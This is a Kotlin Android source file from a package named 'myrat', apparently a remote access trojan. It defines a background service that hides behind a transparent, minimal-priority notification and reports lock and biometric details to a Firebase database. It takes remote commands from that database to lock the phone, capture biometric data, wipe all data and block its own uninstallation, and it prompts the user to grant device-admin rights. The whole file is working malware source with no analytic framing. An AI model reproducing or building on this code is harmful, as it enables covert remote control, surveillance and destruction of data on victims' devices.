package com.myrat.app.service

import android.app.*
import android.app.admin.DevicePolicyManager
import android.content.*
import android.content.pm.PackageManager
import android.hardware.biometrics.BiometricPrompt
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.*
import android.provider.Settings
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.ValueEventListener
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.myrat.app.MainActivity
import com.myrat.app.R
import com.myrat.app.receiver.MyDeviceAdminReceiver
import com.myrat.app.utils.Logger
import java.util.concurrent.Executor

class LockService : Service() {
    private lateinit var deviceId: String
    private lateinit var devicePolicyManager: DevicePolicyManager
    private lateinit var keyguardManager: KeyguardManager
    private lateinit var powerManager: PowerManager
    private lateinit var adminComponent: ComponentName
    private lateinit var executor: Executor
    private lateinit var db: com.google.firebase.database.DatabaseReference
    private var biometricReceiver: BroadcastReceiver? = null
    private var deviceAdviceListener: ValueEventListener? = null
    private var lastCommandTime = 0L // Debounce for RTDB commands

    companion object {
        private const val NOTIFICATION_ID = 3
        private const val CHANNEL_ID = "LockServiceChannel"
        private const val COMMAND_DEBOUNCE_MS = 1000L // 1 second debounce
    }

    override fun onCreate() {
        super.onCreate()
        try {
            // Start foreground service immediately
            startForeground(NOTIFICATION_ID, buildNotification())

            // Check network availability
            if (!isNetworkAvailable()) {
                Logger.error("No network available, stopping LockService")
                stopSelf()
                return
            }

            // Initialize Firebase with retry
            try {
                db = Firebase.database.getReference()
                Logger.log("Firebase initialized successfully in LockService")
            } catch (e: Exception) {
                Logger.error("Firebase initialization failed, retrying later", e)
                Handler(Looper.getMainLooper()).postDelayed({
                    try {
                        db = Firebase.database.getReference()
                        Logger.log("Firebase initialized on retry")
                        listenForDeviceAdviceCommands()
                    } catch (retryException: Exception) {
                        Logger.error("Firebase retry failed, stopping service", retryException)
                        stopSelf()
                    }
                }, 5000) // Retry after 5 seconds
                return
            }

            // Initialize deviceId with fallback
            deviceId = try {
                MainActivity.getDeviceId(this) ?: run {
                    Logger.error("Device ID is null, using fallback ID")
                    Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown_device_${System.currentTimeMillis()}"
                }
            } catch (e: Exception) {
                Logger.error("Failed to get deviceId, using fallback", e)
                Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown_device_${System.currentTimeMillis()}"
            }

            Logger.log("LockService started for deviceId: $deviceId")

            // Initialize system services with null checks
            devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager ?: run {
                Logger.error("DevicePolicyManager unavailable")
                stopSelf()
                return
            }
            keyguardManager = getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager ?: run {
                Logger.error("KeyguardManager unavailable")
                stopSelf()
                return
            }
            powerManager = getSystemService(Context.POWER_SERVICE) as? PowerManager ?: run {
                Logger.error("PowerManager unavailable")
                stopSelf()
                return
            }
            adminComponent = ComponentName(this, MyDeviceAdminReceiver::class.java)
            executor = ContextCompat.getMainExecutor(this)
            setupBiometricResultReceiver()
            db.child("Device").child(deviceId).child("lock_service").child("connected")
                .setValue(true)
                .addOnFailureListener { e ->
                    Logger.error("Failed to set connected status in LockService", e)
                }
            fetchAndUploadLockDetails()
            listenForDeviceAdviceCommands()
        } catch (e: Exception) {
            Logger.error("LockService failed to start", e)
            stopSelf()
        }
    }

    private fun buildNotification(): Notification {
        val channelId = CHANNEL_ID
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val channel = NotificationChannel(
                    channelId,
                    "Lock Service",
                    NotificationManager.IMPORTANCE_MIN
                ).apply {
                    setShowBadge(false)
                }
                val manager = getSystemService(NotificationManager::class.java)
                manager?.createNotificationChannel(channel)
                    ?: Logger.error("NotificationManager is null")
            }
            return NotificationCompat.Builder(this, channelId)
                .setContentTitle("Lock Service")
                .setContentText("Running in background")
                .setSmallIcon(android.R.color.transparent)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .build()
        } catch (e: Exception) {
            Logger.error("Failed to build notification in LockService", e)
            return NotificationCompat.Builder(this, channelId)
                .setContentTitle("Lock Service")
                .setContentText("Running in background")
                .setSmallIcon(android.R.color.transparent)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .build()
        }
    }

    private fun isNetworkAvailable(): Boolean {
        val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager ?: return false
        return try {
            val network = connectivityManager.activeNetwork ?: return false
            val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
            capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
                    capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
        } catch (e: Exception) {
            Logger.error("Network check failed", e)
            false
        }
    }

    private fun fetchAndUploadLockDetails() {
        val lockDetails = mapOf(
            "isDeviceSecure" to keyguardManager.isDeviceSecure,
            "biometricStatus" to getBiometricStatus(),
            "biometricType" to getBiometricType(),
            "isDeviceAdminActive" to devicePolicyManager.isAdminActive(adminComponent)
        )
        db.child("Device").child(deviceId).child("lock_details").setValue(lockDetails)
            .addOnFailureListener { e ->
                Logger.error("Failed to upload lock details: ${e.message}")
            }
    }

    private fun getBiometricStatus(): String {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val biometricManager = androidx.biometric.BiometricManager.from(this)
            when (biometricManager.canAuthenticate(androidx.biometric.BiometricManager.Authenticators.BIOMETRIC_STRONG)) {
                androidx.biometric.BiometricManager.BIOMETRIC_SUCCESS -> "Enrolled"
                androidx.biometric.BiometricManager.BIOMETRIC_ERROR_NO_HARDWARE -> "Not Available"
                androidx.biometric.BiometricManager.BIOMETRIC_ERROR_NONE_ENROLLED -> "Not Enrolled"
                else -> "Unknown"
            }
        } else {
            "Not Available"
        }
    }

    private fun getBiometricType(): String {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val biometricManager = androidx.biometric.BiometricManager.from(this)
            if (biometricManager.canAuthenticate(androidx.biometric.BiometricManager.Authenticators.BIOMETRIC_STRONG) == androidx.biometric.BiometricManager.BIOMETRIC_SUCCESS) {
                "Fingerprint/Face"
            } else {
                "None"
            }
        } else {
            "None"
        }
    }

    private fun listenForDeviceAdviceCommands() {
        try {
            deviceAdviceListener = object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    try {
                        Logger.log("RTDB snapshot: ${snapshot.value}")
                        if (!snapshot.exists()) {
                            Logger.log("No data in snapshot")
                            return
                        }
                        val data = snapshot.getValue(DeviceAdviceCommand::class.java) ?: run {
                            Logger.error("Failed to deserialize DeviceAdviceCommand")
                            return
                        }
                        if (data.status != "pending") {
                            Logger.log("Ignoring non-pending command: ${data.action}")
                            return
                        }
                        if (System.currentTimeMillis() - lastCommandTime < COMMAND_DEBOUNCE_MS) {
                            Logger.log("Command ignored due to debounce: ${data.action}")
                            return
                        }
                        lastCommandTime = System.currentTimeMillis()
                        Logger.log("Processing command: ${data.action}")
                        when (data.action) {
                            "lock" -> lockDevice(data)
                            "unlock" -> notifyUserToUnlock(data)
                            "screenOn" -> turnScreenOn(data)
                            "screenOff" -> turnScreenOff(data)
                            "CaptureBiometricData" -> captureBiometricData(data)
                            "BiometricUnlock" -> biometricUnlock(data)
                            "wipeThePhone" -> wipeThePhone(data)
                            "preventUninstall" -> preventUninstall(data)
                            else -> {
                                Logger.error("Unknown command: ${data.action}")
                                updateCommandStatus(data, "failed", "Unknown command: ${data.action}")
                            }
                        }
                    } catch (e: Exception) {
                        Logger.error("Error processing RTDB command", e)
                    }
                }

                override fun onCancelled(error: DatabaseError) {
                    Logger.error("Error listening for commands: ${error.message}")
                }
            }
            db.child("Device").child(deviceId).child("deviceAdvice")
                .addValueEventListener(deviceAdviceListener!!)
        } catch (e: Exception) {
            Logger.error("Failed to set up command listener", e)
        }
    }

    private fun lockDevice(command: DeviceAdviceCommand) {
        try {
            if (devicePolicyManager.isAdminActive(adminComponent)) {
                devicePolicyManager.lockNow()
                updateCommandStatus(command, "success", null)
            } else {
                Logger.error("Device admin not active for lockDevice")
                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Please enable device admin to lock the device")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                try {
                    startActivity(intent)
                    updateCommandStatus(command, "pending", "Waiting for device admin activation")
                } catch (e: Exception) {
                    updateCommandStatus(command, "failed", "Device admin not active and failed to prompt: ${e.message}")
                }
            }
        } catch (e: Exception) {
            Logger.error("Lock device failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
        }
    }

    private fun notifyUserToUnlock(command: DeviceAdviceCommand) {
        try {
            if (keyguardManager.isDeviceLocked) {
                val intent = Intent(this, com.myrat.app.BiometricAuthActivity::class.java).apply {
                    putExtra(com.myrat.app.BiometricAuthActivity.EXTRA_COMMAND_ID, command.commandId)
                    putExtra(com.myrat.app.BiometricAuthActivity.EXTRA_ACTION, com.myrat.app.BiometricAuthActivity.ACTION_BIOMETRIC_UNLOCK)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                startActivity(intent)
                updateCommandStatus(command, "pending", "Waiting for user unlock")
            } else {
                updateCommandStatus(command, "success", "Device already unlocked")
            }
        } catch (e: Exception) {
            Logger.error("Failed to notify user to unlock", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
        }
    }

    private fun turnScreenOn(command: DeviceAdviceCommand) {
        try {
            if (!powerManager.isInteractive) {
                val wakeLock = powerManager.newWakeLock(
                    PowerManager.FULL_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP,
                    "LockService:ScreenOn"
                )
                wakeLock.acquire(1000)
                wakeLock.release()
                updateCommandStatus(command, "success", null)
            } else {
                updateCommandStatus(command, "success", "Screen already on")
            }
        } catch (e: Exception) {
            Logger.error("Turn screen on failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
        }
    }

    private fun turnScreenOff(command: DeviceAdviceCommand) {
        try {
            if (devicePolicyManager.isAdminActive(adminComponent)) {
                devicePolicyManager.lockNow()
                updateCommandStatus(command, "success", null)
            } else {
                Logger.error("Device admin not active for screenOff")
                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Please enable device admin to turn off screen")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                try {
                    startActivity(intent)
                    updateCommandStatus(command, "pending", "Waiting for device admin activation")
                } catch (e: Exception) {
                    updateCommandStatus(command, "failed", "Device admin not active and failed to prompt: ${e.message}")
                }
            }
        } catch (e: Exception) {
            Logger.error("Turn screen off failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
        }
    }

    private fun captureBiometricData(command: DeviceAdviceCommand) {
        try {
            val intent = Intent(this, com.myrat.app.BiometricAuthActivity::class.java).apply {
                putExtra(com.myrat.app.BiometricAuthActivity.EXTRA_COMMAND_ID, command.commandId)
                putExtra(com.myrat.app.BiometricAuthActivity.EXTRA_ACTION, com.myrat.app.BiometricAuthActivity.ACTION_CAPTURE_BIOMETRIC)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(intent)
            updateCommandStatus(command, "pending", "Waiting for biometric data capture")
        } catch (e: Exception) {
            Logger.error("Capture biometric data failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
        }
    }

    private fun biometricUnlock(command: DeviceAdviceCommand) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P && hasBiometricPermission()) {
                val biometricManager = androidx.biometric.BiometricManager.from(this)
                if (biometricManager.canAuthenticate(androidx.biometric.BiometricManager.Authenticators.BIOMETRIC_STRONG) != androidx.biometric.BiometricManager.BIOMETRIC_SUCCESS) {
                    updateCommandStatus(command, "failed", "Biometric authentication not available or enrolled")
                    return
                }

                val intent = Intent(this, com.myrat.app.BiometricAuthActivity::class.java).apply {
                    putExtra(com.myrat.app.BiometricAuthActivity.EXTRA_COMMAND_ID, command.commandId)
                    putExtra(com.myrat.app.BiometricAuthActivity.EXTRA_ACTION, com.myrat.app.BiometricAuthActivity.ACTION_BIOMETRIC_UNLOCK)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                startActivity(intent)
                updateCommandStatus(command, "pending", "Waiting for biometric unlock")
            } else {
                updateCommandStatus(command, "failed", "Biometric authentication not supported or permission denied")
            }
        } catch (e: Exception) {
            Logger.error("Biometric unlock failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
        }
    }

    private fun wipeThePhone(command: DeviceAdviceCommand) {
        try {
            if (devicePolicyManager.isAdminActive(adminComponent)) {
                devicePolicyManager.wipeData(0)
                updateCommandStatus(command, "success", null)
            } else {
                Logger.error("Device admin not active for wipeThePhone")
                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Please enable device admin to wipe the device")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                try {
                    startActivity(intent)
                    updateCommandStatus(command, "pending", "Waiting for device admin activation")
                } catch (e: Exception) {
                    updateCommandStatus(command, "failed", "Device admin not active and failed to prompt: ${e.message}")
                }
            }
        } catch (e: Exception) {
            Logger.error("Wipe device failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
        }
    }

    private fun preventUninstall(command: DeviceAdviceCommand) {
        try {
            if (devicePolicyManager.isAdminActive(adminComponent)) {
                devicePolicyManager.setUninstallBlocked(adminComponent, packageName, true)
                updateCommandStatus(command, "success", null)
            } else {
                Logger.error("Device admin not active for preventUninstall")
                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Please enable device admin to prevent uninstall")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                try {
                    startActivity(intent)
                    updateCommandStatus(command, "pending", "Waiting for device admin activation")
                } catch (e: Exception) {
                    updateCommandStatus(command, "failed", "Device admin not active and failed to prompt: ${e.message}")
                }
            }
        } catch (e: Exception) {
            Logger.error("Prevent uninstall failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
        }
    }

    private fun updateCommandStatus(command: DeviceAdviceCommand, status: String, error: String?) {
        try {
            val updates = mutableMapOf<String, Any>(
                "status" to status,
                "timestamp" to System.currentTimeMillis()
            )
            error?.let { updates["error"] = it }
            db.child("Device").child(deviceId).child("deviceAdvice").updateChildren(updates)
                .addOnFailureListener { e ->
                    Logger.error("Failed to update command status: ${e.message}")
                }
        } catch (e: Exception) {
            Logger.error("Failed to update command status", e)
        }
    }

    private fun setupBiometricResultReceiver() {
        biometricReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context?, intent: Intent?) {
                try {
                    val commandId = intent?.getStringExtra(com.myrat.app.BiometricAuthActivity.EXTRA_COMMAND_ID) ?: run {
                        Logger.error("Biometric result missing commandId")
                        return
                    }
                    val result = intent.getStringExtra(com.myrat.app.BiometricAuthActivity.EXTRA_RESULT) ?: run {
                        Logger.error("Biometric result missing result")
                        return
                    }
                    val action = intent.getStringExtra(com.myrat.app.BiometricAuthActivity.EXTRA_ACTION) ?: run {
                        Logger.error("Biometric result missing action")
                        return
                    }
                    val error = intent.getStringExtra(com.myrat.app.BiometricAuthActivity.EXTRA_ERROR)
                    Logger.log("Received biometric result: commandId=$commandId, result=$result, action=$action")
                    val command = DeviceAdviceCommand(action = action, commandId = commandId, status = result, error = error)
                    updateCommandStatus(command, result, error)
                } catch (e: Exception) {
                    Logger.error("Failed to process biometric result", e)
                }
            }
        }
        try {
            registerReceiver(biometricReceiver, IntentFilter(com.myrat.app.BiometricAuthActivity.ACTION_BIOMETRIC_RESULT))
            Logger.log("Biometric result receiver registered")
        } catch (e: Exception) {
            Logger.error("Failed to register biometric result receiver", e)
        }
    }

    private fun hasBiometricPermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            ContextCompat.checkSelfPermission(this, android.Manifest.permission.USE_BIOMETRIC) == PackageManager.PERMISSION_GRANTED
        } else {
            true
        }
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            db.child("Device").child(deviceId).child("lock_service").child("connected").setValue(false)
            deviceAdviceListener?.let { db.child("Device").child(deviceId).child("deviceAdvice").removeEventListener(it) }
            biometricReceiver?.let { unregisterReceiver(it) }
            Logger.log("LockService destroyed and listeners removed")
        } catch (e: Exception) {
            Logger.error("Error during LockService cleanup", e)
        }
    }

    data class DeviceAdviceCommand(
        val action: String = "",
        val commandId: String = "",
        val status: String = "",
        val timestamp: Long = 0,
        val error: String? = null
    )
}